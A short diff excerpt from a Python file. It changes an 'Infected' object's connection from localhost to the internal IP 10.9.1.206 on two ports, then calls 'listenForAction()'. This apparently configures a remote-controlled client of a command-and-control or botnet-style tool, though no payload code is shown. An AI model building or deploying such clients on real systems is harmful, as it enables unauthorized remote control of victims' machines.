@@ -68,5 +68,5 @@ class Infected:
   
      
     
-inf = Infected("localhost", 10000, 10001)
+inf = Infected("10.9.1.206", 10000, 10001)
 inf.listenForAction()
